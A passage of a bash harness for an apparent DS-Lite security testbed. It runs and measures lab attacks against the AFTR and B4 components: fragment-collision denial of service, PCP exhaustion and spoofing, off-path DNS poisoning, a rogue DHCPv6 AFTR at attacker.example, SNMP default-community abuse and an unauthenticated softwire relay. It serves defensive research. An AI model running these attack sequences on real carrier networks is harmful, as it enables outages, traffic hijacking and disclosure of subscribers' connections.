    step "Surface: Fragment. The AFTR must reassemble the victim's oversized inner IPv4."
    start_caps "$(spec_T5)" "$outdir" "T5"
    step "Attack: collider LOCKS onto the victim's live inner IP-ID and tiles offset-0 holes just ahead of it."
    # The collider MUST sniff the victim's advancing inner IP-ID (its _id_tracker
    # thread) so each seeded offset-0 hole shares the victim's NEXT datagram ID,
    # within ipfrag_max_dist (64). Running blind (--no-sniff) sweeps the whole
    # 16-bit space once and collides with almost nothing -> no denial. So we drop
    # --no-sniff and feed it a live victim flow to lock onto.
    local cmd="python3 $T/tunnel/fragment_attack.py collide --interface eth-isp --src-ip6 $ATK6 --aftr-ip6 $AFTR --b4-src-ip6 $VB4 --inner-src-ip4 $C1 --inner-dst-ip4 $tgt --proto 1 --band $band --duration 26"
    CMDS_RUN="attacker: $cmd
client1 (victim fragmented flow): ping -s 3000 -c 30 $tgt"
    nse attacker sh -c "$cmd >/dev/null 2>&1 &"
    sleep 1.5   # let the collider's sniff socket come up before the victim flows
    step "Victim flow warms the collider's IP-ID lock (fragmented ping)."
    # warmup: the initial sniff observes the victim's inner IP-ID, then the
    # _id_tracker keeps it fresh as the seeding window spins up.
    nse client1 sh -c "ping -s 3000 -c 30 -i 0.25 -W 1 $tgt >/dev/null 2>&1"
    step "Victim runs an oversized (fragmented) ping during ACTIVE seeding; we watch its loss."
    local pout loss
    pout=$(nse client1 sh -c "ping -s 3000 -c 30 -i 0.25 -W 1 $tgt 2>&1" )
    loss=$(echo "$pout" | grep -oE '[0-9]+(\.[0-9]+)?% packet loss' | grep -oE '^[0-9]+' | head -1)
    [ -z "$loss" ] && loss=0
    nse attacker pkill -9 -f fragment_attack 2>/dev/null
    stop_caps; cap_summary
    info "victim oversized-ping loss during the collision = ${loss}%"
    REF_LINE="victim's fragmented flow collides on overlap and is dropped (high loss)"
    RUN_LINE="victim oversized-ping packet loss = ${loss}%"
    [ "${loss:-0}" -ge 50 ] && VERDICT_PASS=1 || VERDICT_PASS=0
}

# ─────────────────────────────────────────────────────────────────────────
# TS2 - PCP Port-Exhaustion DoS (drain a B4's pool, freeze co-residents)
# ─────────────────────────────────────────────────────────────────────────
spec_TS2() { echo "1-pcp-uplink|b4-1|eth-isp|udp port 5351;2-aftr-pcp|aftr|eth-isp|udp port 5351"; }
knobs_TS2() { echo "count:600|1200"; }
do_TS2() {
    local outdir="$1" cnt; cnt=$(knob_val COUNT 600)
    step "Surface: AFTR PCP allocation table (per-subscriber port pool)."
    restart_pcp 400   # clean, small pool so exhaustion is reachable + reproducible
    start_caps "$(spec_TS2)" "$outdir" "TS2"
    step "Attack: a B4-1 host floods MAP requests to drain B4-1's PCP pool."
    local cmd="python3 $T/infra/pcp_attack.py exhaust --proxy-ip $GW1 --proto 17 --count $cnt"
    CMDS_RUN="client1: $cmd
co-resident probe: pcp_attack.py map --proxy-ip $GW1 --proto 17"
    local exout; exout=$(nse client1 sh -c "timeout 20 $cmd 2>&1")
    info "$(echo "$exout" | grep -iE 'created|sent' | tail -1)"
    step "Measure: a legit co-resident on B4-1 now asks for a mapping (same UDP pool)."
    local mapout; mapout=$(nse client1 timeout 8 python3 "$T/infra/pcp_attack.py" map --proxy-ip "$GW1" --proto 17 --internal-port 9090 2>&1)
    local frozen=0; echo "$mapout" | grep -qiE 'Mapping created' || frozen=1
    info "$(echo "$mapout" | grep -iE 'created|failed|result|NO_RESOURCES' | tail -1)"
    stop_caps; cap_summary
    restart_pcp 1024   # restore the default pool
    REF_LINE="pool drained; a co-resident's legit MAP is refused (NO_RESOURCES)"
    RUN_LINE="co-resident MAP $([ "$frozen" = 1 ] && echo 'REFUSED (frozen)' || echo 'still succeeded')"
    VERDICT_PASS=$frozen
}

# ─────────────────────────────────────────────────────────────────────────
# T6 - Unauthorized THIRD_PARTY Forwarding (open inbound to another subscriber)
# ─────────────────────────────────────────────────────────────────────────
spec_T6() { echo "1-thirdparty-map|b4-1|eth-isp|udp port 5351;2-aftr-pcp|aftr|eth-isp|udp port 5351;3-inbound-to-victim|aftr|eth-wan|tcp"; }
knobs_T6() { echo "victim:$C2"; }
do_T6() {
    local outdir="$1" victim; victim=$(knob_val VICTIM "$C2")
    step "Surface: AFTR PCP THIRD_PARTY option (no ownership check)."
    nse aftr nft flush chain ip nat pcp_dnat 2>/dev/null
    start_caps "$(spec_T6)" "$outdir" "T6"
    step "Attack: a B4-1 host installs a THIRD_PARTY MAP naming a DIFFERENT subscriber ($victim)."
    local cmd="python3 $T/infra/pcp_attack.py thirdparty --proxy-ip $GW1 --target-internal $victim"
    CMDS_RUN="client1: $cmd"
    nse client1 sh -c "timeout 10 $cmd >/dev/null 2>&1"
    step "Measure: did the AFTR install a inbound forwarding rule pointing the shared IP at the non-owned victim?"
    local rule dnat ext int; rule=$(nse aftr nft list chain ip nat pcp_dnat 2>/dev/null | grep "dnat to $victim" | head -1)
    dnat=$(nse aftr nft list chain ip nat pcp_dnat 2>/dev/null | grep -c "dnat to $victim")
    ext=$(echo "$rule" | grep -oE 'dport [0-9]+' | awk '{print $2}')
    int=$(echo "$rule" | grep -oE "$victim:[0-9]+" | cut -d: -f2)
    info "AFTR installed $dnat cross-subscriber inbound-forwarding rules (e.g. $SHARED:$ext -> $victim:$int)"
    step "Impact: an EXTERNAL host reaches the non-owned victim via $SHARED:$ext."
    nse "$(_ns_of "$victim")" sh -c "timeout 6 socat -u TCP-LISTEN:${int:-0},reuseaddr SYSTEM:'echo VICTIM-GOT-INBOUND' >/tmp/t8vic.out 2>&1" &
    sleep 1
    nse server sh -c "echo probe | timeout 4 socat - TCP:$SHARED:${ext:-0} >/dev/null 2>&1"
    sleep 1
    local reached; reached=$(nse "$(_ns_of "$victim")" sh -c 'cat /tmp/t8vic.out 2>/dev/null' | grep -c "VICTIM-GOT-INBOUND")
    stop_caps; cap_summary
    info "external probe to $SHARED:$ext reached the victim $victim = $([ "${reached:-0}" -gt 0 ] && echo YES || echo no)"
    REF_LINE="attacker opens an inbound port on the shared IP to a NON-OWNED co-sub; external traffic then reaches the victim"
    RUN_LINE="forged inbound-forwarding rules=$dnat ($SHARED:$ext->$victim:$int); external probe reached victim=$([ "${reached:-0}" -gt 0 ] && echo yes || echo no)"
    if [ "$dnat" -gt 0 ] && [ "${reached:-0}" -gt 0 ]; then VERDICT_PASS=1; else VERDICT_PASS=0; fi
}
# which netns hosts a given subscriber inner IPv4 (10.0.1.100->client1, 10.0.2.100->client2)
_ns_of() { case "$1" in 10.0.1.*) echo client1;; 10.0.2.*) echo client2;; *) echo client2;; esac; }

# ─────────────────────────────────────────────────────────────────────────
# TS3 - PCP ANNOUNCE Spoof / Epoch Reset (one packet -> mass renew storm)
# ─────────────────────────────────────────────────────────────────────────
spec_TS3() { echo "1-attacker-announce|attacker|eth-isp|udp port 5351 or udp port 5350;2-b4-renew-storm|b4-1|eth-isp|udp port 5351 or udp port 5350"; }
knobs_TS3() { echo "count:10; seed:60"; }
do_TS3() {
    local outdir="$1" cnt seed; cnt=$(knob_val COUNT 10); seed=$(knob_val SEED 60)
    urpf off; ensure_attacker_isp
    restart_pcp 1024
    reset_b4proxy               # clean the B4 client mapping table -> deterministic storm
    step "Surface: PCP ANNOUNCE / restart signal. A reset makes clients believe the server rebooted."
    step "Seed: create $seed legit mappings on the B4 so there is a mapping table to renew."
    nse client1 sh -c "timeout 8 python3 $T/infra/pcp_attack.py exhaust --proxy-ip $GW1 --count $seed >/dev/null 2>&1"
    start_caps "$(spec_TS3)" "$outdir" "TS3"
    step "Attack: attacker forges $cnt PCP ANNOUNCE (server-restart signal) from the AFTR address."
    local cmd="python3 $T/infra/pcp_attack.py announce --interface eth-isp --aftr-ip6 $AFTR --count $cnt"
    CMDS_RUN="attacker: $cmd"
    nse attacker sh -c "timeout 12 $cmd >/dev/null 2>&1"
    sleep 2                     # let the proxy finish emitting the renewals to its log
    stop_caps; cap_summary
    step "Measure: how many mappings did each ANNOUNCE force the B4 to re-create?"
    # Deterministic ground truth from the B4 proxy's own epoch log (RFC 6887 8.5):
    # each backward-epoch ANNOUNCE re-creates the WHOLE mapping table, so the renewal
    # count is (# ANNOUNCE) x (mappings held) and does not depend on capture timing.
    # (A raw packet capture undercounts/overcounts with proxy state and buffering,
    # which is why the earlier tcpdump-window figure was not reproducible.)
    local resets per renewals
    resets=$(grep -c 'EPOCH RESET' "$B41_PROXY_LOG" 2>/dev/null); resets=${resets:-0}
    per=$(grep -oE 're-creating [0-9]+ mapping' "$B41_PROXY_LOG" 2>/dev/null | grep -oE '[0-9]+' | sort -rn | head -1); per=${per:-0}
    renewals=$(grep -oE 'renewal storm sent: [0-9]+' "$B41_PROXY_LOG" 2>/dev/null | grep -oE '[0-9]+' | awk '{s+=$1} END{print s+0}')
    info "each ANNOUNCE re-created all $per mappings; $resets ANNOUNCE -> $renewals renewal MAP requests on the B4 uplink"
    restart_pcp 1024
    REF_LINE="each ANNOUNCE re-creates the B4's full mapping table; $cnt announces x $seed mappings = $((cnt*seed)) renewal MAP requests"
    RUN_LINE="renewal MAP requests = $renewals ($per per ANNOUNCE x $resets ANNOUNCE)"
    { [ "$resets" -eq "$cnt" ] && [ "$per" -ge 1 ] && [ "$renewals" -eq "$((resets*per))" ]; } && VERDICT_PASS=1 || VERDICT_PASS=0
}

# ─────────────────────────────────────────────────────────────────────────
# T7 - Cross-Subscriber PCP PEER Enumeration (leak another sub's NAT ports)
# ─────────────────────────────────────────────────────────────────────────
spec_T7() { echo "1-cross-sub-peer-leak|b4-1|eth-isp|udp port 5351;2-aftr-pcp|aftr|eth-isp|udp port 5351"; }
knobs_T7() { echo "trials:2|3; flows:3"; }
do_T7() {
    local outdir="$1" trials flows; trials=$(knob_val TRIALS 2); flows=$(knob_val FLOWS 3)
    restart_pcp 1024
    step "Surface: AFTR PCP PEER operation (returns external IP:port for a flow)."
    start_caps "$(spec_T7)" "$outdir" "T7"
    step "Attack: a B4-1 host abuses PEER to learn a DIFFERENT subscriber's external ports."
    local cmd="python3 $T/infra/t7_peer_crosssub.py --trials $trials --flows $flows"
    CMDS_RUN="b4-1: $cmd"
    local out; out=$(nse b4-1 sh -c "timeout 40 $cmd 2>&1")
    echo "$out" | grep -iE 'wildcard_leak|verdict|trials passed|SUCCESS|precision' | sed 's/^/      /'
    stop_caps; cap_summary
    step "Measure: did the tool confirm a cross-subscriber leak (leaked port == real port)?"
    local ok=0; echo "$out" | grep -qiE 'T7 SUCCESS' && ok=1
    REF_LINE="cross-subscriber observation-isolation broken (leaked external port == victim's real port)"
    RUN_LINE="$(echo "$out" | grep -iE 'trials passed|aggregate TP' | tr '\n' ' ' | sed 's/  */ /g')"
    VERDICT_PASS=$ok
}

# ─────────────────────────────────────────────────────────────────────────
# T8 - Softwire DNS-Discovery Hijack (off-path poison of the B4's RFC-6334
#       AFTR-FQDN resolution -> exit-hook rebuilds the softwire to the attacker)
# ─────────────────────────────────────────────────────────────────────────
spec_T8() { echo "1-offpath-flood|attacker|eth-isp|udp port 53;2-b4-resolver|b4-1|eth-isp|udp port 53"; }
knobs_T8() { echo "rounds:2|4"; }
# Off-path (SADDNS/Kaminsky) poisoning of the B4's AFTR-FQDN resolution. The
# attacker is OFF-PATH and cannot see the query; it is granted the resolver's
# upstream source port (the SADDNS ICMP-rate-limit side channel derandomises it -
# shown feasible) and brute-forces the 16-bit TXID inside a wide in-flight window
# (a slow/unresponsive authoritative server). The B4 resolver here is the DNS-0x20
# forwarder so the Dagon-0x20 defence can be toggled against the SAME attack. The
# 0x20 state is read from /run/t11-0x20-mode (set by article_defenses.sh DNS_0X20).
_t11_resolver_up() {  # <zerox20 0|1> <cookies 0|1>
    nse dns-server ip -6 addr add ${C_PREFIX}::5/64 dev eth-isp 2>/dev/null
    nse dns-server pkill -9 -f dns_sink.py 2>/dev/null
    nsd dns-server python3 $T/dns/dns_sink.py ${C_PREFIX}::5 53
    nse b4-1 sh -c "pkill -9 -F /var/run/dnsmasq-b4-1.pid 2>/dev/null; pkill -9 -f 'dns_0x20_forwarder|dns_cookies_forwarder' 2>/dev/null"
    sleep 0.4
    nse b4-1 sysctl -qw net.core.rmem_max=33554432 2>/dev/null
    if [ "${2:-0}" = 1 ]; then
        # DNS Cookies (RFC 7873): reject any reply not echoing the Client Cookie.
        nsd b4-1 python3 /testbed/defenses/dns_cookies_forwarder.py --listen-ip ::1 \
            --listen-port 5354 --upstream ${C_PREFIX}::5 --src-ip $VB4 --src-port 33333 \
            --cookies 1 --timeout 9
    else
        # DNS-0x20 (or, with $1=0, the vulnerable baseline).
        nsd b4-1 python3 /testbed/defenses/dns_0x20_forwarder.py --listen-ip ::1 \
            --listen-port 5354 --upstream ${C_PREFIX}::5 --src-ip $VB4 --src-port 33333 \
            --zerox20 "$1" --timeout 9
    fi
    sleep 1
}
_t11_resolver_down() {
    nse b4-1 pkill -9 -f 'dns_0x20_forwarder|dns_cookies_forwarder' 2>/dev/null
    nse dns-server pkill -9 -f dns_sink.py 2>/dev/null
    nse dns-server ip -6 addr del ${C_PREFIX}::5/64 dev eth-isp 2>/dev/null
    # restore the stock B4 resolver
    nsd b4-1 dnsmasq --interface=eth-lan --except-interface=lo --bind-interfaces \
        --no-resolv --server=${DNS_IP6:-2001:db8:cafe::2} --no-dhcp-interface=eth-lan \
        --address=/client1.dslite.example.com/10.0.1.100 --proxy-dnssec \
        --log-facility=/var/log/dnsmasq.log --pid-file=/var/run/dnsmasq-b4-1.pid 2>/dev/null
}
do_T8() {
    local outdir="$1" rounds dom; rounds=$(knob_val ROUNDS 2); dom=aftr.dslite.example.com
    ensure_attacker_isp
    local zx; zx=$(nse b4-1 cat /run/t11-0x20-mode 2>/dev/null | tr -d '[:space:]'); zx="${zx:-0}"
    local ck; ck=$(nse b4-1 cat /run/t11-cookies-mode 2>/dev/null | tr -d '[:space:]'); ck="${ck:-0}"
    step "Surface: off-path poisoning of the B4's AFTR-FQDN resolution (RFC 6334)."
    if [ "$ck" = 1 ]; then
        info "DNS Cookies (RFC 7873) at the B4 resolver = ON"
    else
        info "0x20 case-randomisation at the B4 resolver = $([ "$zx" = 1 ] && echo ON || echo OFF)"
    fi
    _t11_resolver_up "$zx" "$ck"
    start_caps "$(spec_T8)" "$outdir" "T8"
    step "Victim B4 resolves the AFTR FQDN (query hangs on the slow upstream = wide window)."
    nse b4-1 sh -c "dig AAAA $dom @::1 -p 5354 +time=9 +tries=1 >/dev/null 2>&1 &"
    sleep 0.6
    step "Attack: OFF-PATH attacker floods forged AAAA (granted port, brute 65536 TXIDs)."
    local cmd="python3 $T/dns/dns_offpath_poison.py --iface eth-isp --upstream ${C_PREFIX}::5 --resolver $VB4 --resolver-port 33333 --domain $dom --poison-ip $ATK6 --rounds $rounds"
    CMDS_RUN="attacker: $cmd"
    nse attacker sh -c "timeout 12 $cmd >/dev/null 2>&1"
    sleep 3
    stop_caps; cap_summary
    step "Measure: what AAAA did the B4 resolver cache for $dom?"
    local ans; ans=$(nse b4-1 sh -c "dig +short AAAA $dom @::1 -p 5354 +time=3 +tries=1 2>/dev/null" | grep -E '^[0-9a-f:]+$' | head -1)
    info "B4 resolver answers $dom -> ${ans:-<none>}  (attacker = $ATK6)"
    _t11_resolver_down
    REF_LINE="off-path flood poisons the B4 cache: $dom -> attacker ($ATK6)"
    RUN_LINE="$dom resolved to ${ans:-<none>} at the B4 resolver"
    [ "$ans" = "$ATK6" ] && VERDICT_PASS=1 || VERDICT_PASS=0
}

# ─────────────────────────────────────────────────────────────────────────
# T9 - Rogue AFTR Substitution (DHCPv6 Option 64 -> attacker FQDN)
# ─────────────────────────────────────────────────────────────────────────
spec_T9() { echo "1-rogue-dhcpv6|attacker|eth-isp|udp port 546 or udp port 547;2-b4-receives|b4-1|eth-isp|udp port 546 or udp port 547;3-victim-tunnels-to-attacker|attacker|eth-isp|ip6 proto 4"; }
knobs_T9() { echo "fqdn:aftr-evil.attacker.example"; }
# the remote endpoint a B4's ds-lite softwire currently points at
_tun_remote() { nse "$1" ip -6 tunnel show ds-lite 2>/dev/null | grep -oE 'remote [0-9a-f:]+' | awk '{print $2}'; }
# After a softwire-redirect (T9/T9) the B4's tunnel remote points at the
# attacker. Two things make the diversion observable AT the attacker reliably:
#  (1) prime the B4->attacker neighbor - otherwise the first encapsulated frames
#      are dropped while NDP resolves and a one-shot probe ends before it does
#      (the old "frames-to-attacker=0" false negative), and
#  (2) drive SUSTAINED victim traffic during the capture window, not a single GET.
# Returns the victim's last HTTP code on stdout; frames land in the T1?_3 capture.
_drive_victim_to_attacker() {  # <victim_ns>  -> echoes victim HTTP code
    local vns="${1:-client1}"
    # prime: make the attacker reachable in the B4's neighbor cache both ways so
    # the redirected softwire is delivered immediately (no NDP-resolution drop).
    nse attacker ping6 -c1 -W1 "$VB4"  >/dev/null 2>&1 || true
    nse b4-1    ping6 -c1 -W1 "$ATK6"  >/dev/null 2>&1 || true
    # Fast, NON-blocking inner burst: ping returns at once (curl blocks for its
    # full --max-time on every 000), so the encapsulated frames reliably land at
    # the attacker INSIDE the capture window. These inner ICMP packets are
    # encapsulated to remote=attacker and show up as ip6-proto-4 at the attacker.
    nse "$vns" ping -c 5 -i 0.2 -W1 "$SRV" >/dev/null 2>&1 || true
    # one short HTTP probe for the user-facing service verdict (000 = denied)
    local code
    code=$(nse "$vns" sh -c "curl -s -o /dev/null -w '%{http_code}' --max-time 3 http://$SRV/ 2>/dev/null" | tr -dc '0-9')
    echo "${code:-000}"
}
# put the victim B4's softwire back on the real AFTR after a redirect attack
_heal_softwire() {
    nse attacker pkill -f dhcpv6_hijack 2>/dev/null
    nse b4-1 ip -6 addr add ${VB4}/64 dev eth-isp 2>/dev/null
    nse b4-1 ip -6 tunnel change ds-lite remote $AFTR local $VB4 2>/dev/null
    nse b4-1 sh -c "echo ${AFTR_LEGIT:-aftr.dslite.example.com.} > /run/ds-lite-aftr-name" 2>/dev/null
}
do_T9() {
    local outdir="$1" fq; fq=$(knob_val FQDN aftr-evil.attacker.example)
    ensure_attacker_isp
    step "Surface: DHCPv6 AFTR-Name (Option 64). The B4 trusts whoever answers first."
    local pre_remote; pre_remote=$(_tun_remote b4-1)
    info "before: B4 softwire remote = $pre_remote (the real AFTR)"
    start_caps "$(spec_T9)" "$outdir" "T9"
    step "Attack: rogue DHCPv6 server advertises a NEW attacker AFTR name ($fq)."
    local cmd="python3 $T/infra/dhcpv6_hijack.py dhcp --interface eth-isp --attack-id T9 --attacker-ip6 $ATK6 --fake-aftr-fqdn $fq --fake-aftr-ip6 $ATK6 --auto-trigger-victim b4-1"
    CMDS_RUN="attacker: $cmd"
    nse attacker sh -c "timeout 16 $cmd >/dev/null 2>&1"
    sleep 2
    step "Measure: did the B4 adopt the attacker name AND rebuild its softwire to the attacker?"
    local name remote; name=$(nse b4-1 cat /run/ds-lite-aftr-name 2>/dev/null | tr -d '[:space:]')
    remote=$(_tun_remote b4-1)
    info "B4 cached AFTR name = ${name:-<none>}   softwire remote: $pre_remote -> $remote"
    step "Impact: the victim now tunnels its IPv4 to the attacker and loses real service."
    local v1; v1=$(_drive_victim_to_attacker client1)
    info "victim client1 internet = HTTP $v1 (attacker is not a real AFTR)"
    stop_caps; cap_summary
    local got; got=$(pcap_count "$outdir/T9_3-victim-tunnels-to-attacker.pcap" "ip6 proto 4")
    info "victim softwire frames captured arriving at the attacker = $got"
    _heal_softwire
    REF_LINE="B4 adopts attacker name ($fq) AND rebuilds its softwire to the attacker ($ATK6); victim loses service"
    RUN_LINE="name=${name:-<none>}, softwire remote $pre_remote->$remote, victim HTTP=$v1, frames-to-attacker=$got"
    if echo "$name" | grep -qiF "$fq" && [ "$remote" = "$ATK6" ] && [ "${got:-0}" -gt 0 ]; then VERDICT_PASS=1; else VERDICT_PASS=0; fi
}

# ─────────────────────────────────────────────────────────────────────────
# T9 - Transparent AFTR Hijack (keep the legit name, poison it to attacker IP)
# ─────────────────────────────────────────────────────────────────────────
spec_T9b() { echo "1-rogue-dns|attacker|eth-isp|udp port 546 or udp port 547 or udp port 53;2-b4-receives|b4-1|eth-isp|udp port 546 or udp port 547 or udp port 53;3-victim-tunnels-to-attacker|attacker|eth-isp|ip6 proto 4"; }
knobs_T9b() { echo "fqdn:aftr.dslite.example.com"; }
do_T9b() {
    local outdir="$1" fq; fq=$(knob_val FQDN aftr.dslite.example.com)
    ensure_attacker_isp
    step "Surface: DHCPv6 + DNS. Keep the legit AFTR name but make it resolve to the attacker."
    local pre_remote; pre_remote=$(_tun_remote b4-1)
    info "before: B4 softwire remote = $pre_remote (the real AFTR), name = $(nse b4-1 cat /run/ds-lite-aftr-name 2>/dev/null|tr -d '[:space:]')"
    start_caps "$(spec_T9b)" "$outdir" "T9b"
    step "Attack: rogue server keeps name $fq but binds it to the attacker ($ATK6)."
    local cmd="python3 $T/infra/dhcpv6_hijack.py dhcp --interface eth-isp --attack-id T9 --attacker-ip6 $ATK6 --fake-aftr-fqdn $fq --fake-aftr-ip6 $ATK6 --auto-trigger-victim b4-1"
    CMDS_RUN="attacker: $cmd"
    nse attacker sh -c "timeout 16 $cmd >/dev/null 2>&1"
    sleep 2
    step "Measure: the legit name is KEPT, but the softwire is rebuilt to the attacker."
    local name remote; name=$(nse b4-1 cat /run/ds-lite-aftr-name 2>/dev/null | tr -d '[:space:]')
    remote=$(_tun_remote b4-1)
    info "B4 cached name = ${name:-<none>} (still legit)   softwire remote: $pre_remote -> $remote"
    step "Impact: the victim now tunnels its IPv4 to the attacker though the name looks legit."
    local v1; v1=$(_drive_victim_to_attacker client1)
    info "victim client1 internet = HTTP $v1 (attacker is not a real AFTR -> denial)"
    stop_caps; cap_summary
    local got; got=$(pcap_count "$outdir/T9b_3-victim-tunnels-to-attacker.pcap" "ip6 proto 4")
    info "victim softwire frames captured arriving at the attacker = $got"
    _heal_softwire
    REF_LINE="name stays $fq (legit) but the softwire is rebuilt to the attacker ($ATK6); victim traffic diverted to the attacker"
    RUN_LINE="name=${name:-<none>} (kept legit), softwire remote $pre_remote->$remote, victim HTTP=$v1, frames-to-attacker=$got"
    if echo "$name" | grep -qiF "$fq" && [ "$remote" = "$ATK6" ] && [ "${got:-0}" -gt 0 ]; then VERDICT_PASS=1; else VERDICT_PASS=0; fi
}

# ─────────────────────────────────────────────────────────────────────────
# T10 - DS-Lite MIB unauthenticated access: default community grants an
#       alarm-threshold WRITE (blinds the NOC) and a bind-table READ (discloses
#       every subscriber's private connections). RFC 7870 defines the MIB; §9
#       mandates SNMPv3 USM, disabled in the default build.
# ─────────────────────────────────────────────────────────────────────────
spec_T10() { echo "1-snmp-set|aftr|eth-mgmt|udp port 161;2-mgmt-station|mgmt|eth-mgmt|udp port 161"; }
knobs_T10() { echo "value:2147483647"; }
do_T10() {
    # RFC 7870 §8: dsliteAFTRAlarmPortNumber (.240.1.3.1.8) is an UNCONSTRAINED
    # Integer32 per-user NAT-port alarm threshold. Raising it to Integer32-max
    # disables the alarm that would otherwise flag a port-exhaustion attack.
    local outdir="$1" val oid cn; val=$(knob_val VALUE 2147483647)
    oid=1.3.6.1.2.1.240.1.3.1.8          # dsliteAFTRAlarmPortNumber (r/w)
    cn=1.3.6.1.2.1.240.1.3.1.6           # dsliteAFTRAlarmConnectNumber (r/w, 60..90)
    step "Surface: SNMP/MIB OAM plane (DSLITE-MIB, RFC 7870); default community, no USM."
    step "Seed: drive both subscribers so the AFTR holds a binding for each."
    nse client1 sh -c "for p in 1 2 3; do curl -s -o /dev/null --max-time 2 http://$SRV/ & done; wait" >/dev/null 2>&1
    nse client2 sh -c "for p in 1 2 3; do curl -s -o /dev/null --max-time 2 http://$SRV/ & done; wait" >/dev/null 2>&1
    nse mgmt snmpset -v2c -c public -t1 10.99.0.1 $oid i 1000 >/dev/null 2>&1   # NOC enables the per-user port alarm
    local base; base=$(nse mgmt snmpget -v2c -c public -t1 10.99.0.1 $oid 2>/dev/null | grep -oE '\-?[0-9]+$')
    step "Baseline: dsliteAFTRAlarmPortNumber = ${base:-?} (NOC's per-user NAT-port alarm)."
    start_caps "$(spec_T10)" "$outdir" "T10"
    step "Attack (write): a mgmt-reachable host raises the port-usage alarm to Integer32 max so it never fires."
    local cmd="python3 $T/infra/snmp_attack.py set --target 10.99.0.1 --oid alarmPortNumber --value $val"
    nse mgmt sh -c "timeout 10 $cmd >/dev/null 2>&1"
    step "Attack (read): walk the DSLITE-MIB bind table, disclosing every subscriber's private NAT connections."
    local rcmd="python3 $T/infra/snmp_attack.py read --target 10.99.0.1 --oids all"
    local out; out=$(nse mgmt sh -c "timeout 18 $rcmd 2>&1")
    CMDS_RUN="mgmt: $cmd ; $rcmd"
    stop_caps; cap_summary
    step "Measure: threshold raised, distinct subscribers disclosed, and the RFC range enforced on ConnectNumber."
    local rb; rb=$(nse mgmt snmpget -v2c -c public -t1 10.99.0.1 $oid 2>/dev/null | grep -oE '\-?[0-9]+$')
    local subs; subs=$(echo "$out" | grep -oE 'src=10\.0\.[0-9]+\.[0-9]+' | sed 's/src=//' | sort -u)
    local n; n=$(echo "$subs" | grep -c '10\.0\.')
    # RFC conformance check: ConnectNumber is Integer32(60..90); an out-of-range SET MUST be rejected.
    local cn_before cn_after
    cn_before=$(nse mgmt snmpget -v2c -c public -t1 10.99.0.1 $cn 2>/dev/null | grep -oE '[0-9]+$')
    nse mgmt snmpset -v2c -c public -t1 10.99.0.1 $cn i 2147483647 >/dev/null 2>&1
    cn_after=$(nse mgmt snmpget -v2c -c public -t1 10.99.0.1 $cn 2>/dev/null | grep -oE '[0-9]+$')
    info "port-usage alarm threshold now = ${rb:-?} (was ${base:-?}) -> NOC blind to port exhaustion"
    info "distinct subscriber inner IPs disclosed via the MIB = $n  [$(echo "$subs" | tr '\n' ' ')]"
    info "ConnectNumber out-of-range SET: tried 2147483647, value stayed ${cn_after:-?} (RFC 60..90 enforced)"
    REF_LINE="unauthenticated MIB access raises the per-user port alarm to Integer32 max (never fires) AND discloses >=2 subscribers' private connections; ConnectNumber out-of-range SET rejected per RFC 60..90"
    RUN_LINE="PortNumber ${base:-?}->${rb:-?}; subscribers disclosed $n; ConnectNumber stayed ${cn_after:-?}"
    if [ -n "$rb" ] && [ "$rb" -gt 1000000 ] && [ "${n:-0}" -ge 2 ] && [ "${cn_after:-0}" = "${cn_before:-60}" ]; then VERDICT_PASS=1; else VERDICT_PASS=0; fi
}

# ─────────────────────────────────────────────────────────────────────────
# T11 - Unauthenticated softwire decapsulation (RFC 6333 defines no B4
#       authentication, so the wildcard softwire decapsulates 4in6 from any
#       source; an UNPROVISIONED carrier host relays IPv4 to the Internet
#       laundered as the shared public IPv4. CVE-2025-23018 / VU#199397 class,
#       measured at Internet scale by Beitis & Vanhoef, USENIX Security 2025;
#       the upstream complement to T4. The DS-Lite-specific §6.6 overlap-routing
#       amplification loop the same surface harbors is measured under DECAP_BIND.)
# ─────────────────────────────────────────────────────────────────────────
spec_T11() { echo "1-attacker-4in6|attacker|eth-isp|ip6 proto 4;2-aftr-egress|aftr|eth-wan|host $SRV"; }
knobs_T11() { echo "count:8|20; isrc:10.66.66.66"; }
do_T11() {
    local outdir="$1" cnt isrc; cnt=$(knob_val COUNT 8); isrc=$(knob_val ISRC 10.66.66.66)
    urpf off; ensure_attacker_isp
    step "Surface: AFTR softwire ingress. RFC 6333 authenticates no B4, so the wildcard softwire decapsulates 4in6 from any carrier source."
    nse attacker ping6 -c 1 -W 1 "$AFTR" >/dev/null 2>&1   # warm ND so the crafted 4in6 resolves the AFTR MAC (reset_state flushes it)
    start_caps "$(spec_T11)" "$outdir" "T11"
    sleep 2   # let the pcap sniffers attach before the burst (start_caps window)
    step "Attack: an UNPROVISIONED carrier host (no DHCPv6/PCP) sends 4in6 to the AFTR ($AFTR), inner $isrc -> Internet $SRV."
    info "the AFTR decapsulates, NATs the inner packet to the shared public IPv4 ($SHARED), and forwards it - an open one-way proxy."
    local cmd="python3 $T/tunnel/softwire_relay.py --local-ip6 $ATK6 --aftr-ip6 $AFTR --inner-src $isrc --target $SRV --count $cnt --interval 0.3"
    CMDS_RUN="attacker: $cmd"
    nse attacker sh -c "timeout 15 $cmd >/dev/null 2>&1"
    sleep 1
    stop_caps; cap_summary
    step "Measure: do the relayed packets egress the AFTR's public side laundered as the shared IPv4 ($SHARED -> $SRV)?"
    local wan rel; wan="$outdir/T11_2-aftr-egress.pcap"
    rel=$(pcap_count "$wan" "src $SHARED and dst $SRV")
    info "relayed packets leaving the AFTR as the shared public IPv4 = $rel"
    REF_LINE="an unprovisioned host relays IPv4 to the Internet through the AFTR, laundered as the shared public IPv4 (>0)"
    RUN_LINE="relayed packets egressing as $SHARED -> $SRV = $rel"
    [ "${rel:-0}" -gt 0 ] && VERDICT_PASS=1 || VERDICT_PASS=0
}

# ─────────────────────────────────────────────────────────────────────────
# T12 - Softwire Identity Multiplication. RFC 6333 authenticates no B4, so the
#       RFC 6888 per-subscriber cap keys on the FORGEABLE outer IPv6 source. A
#       single identity is capped at 2000 bindings and cannot exhaust the shared
#       64,512-port pool (this is T1's "isolation holds"); MANY forged identities
#       drain the pool for a targeted endpoint and deny co-subscribers, the
#       positive counterpart to the T1 negative finding. Closed by SAVI (D3).
# ─────────────────────────────────────────────────────────────────────────
spec_T12() { echo "1-attacker-4in6|attacker|eth-isp|ip6 proto 4;2-aftr-egress|aftr|eth-wan|host $SRV"; }
knobs_T12() { echo "dport:80"; }
do_T12() {
    local outdir="$1" dport pfx; dport=$(knob_val DPORT 80); pfx="${C_PREFIX}:dead::/64"
    urpf off; ensure_attacker_isp
    step "Surface: AFTR NAT/CGN shared port pool (RFC 6888 per-subscriber cap keyed on the forgeable softwire identity)."
    step "Baseline: co-residents behind both B4s reach the target endpoint ($SRV:$dport); the shared pool is 64,512 ports."
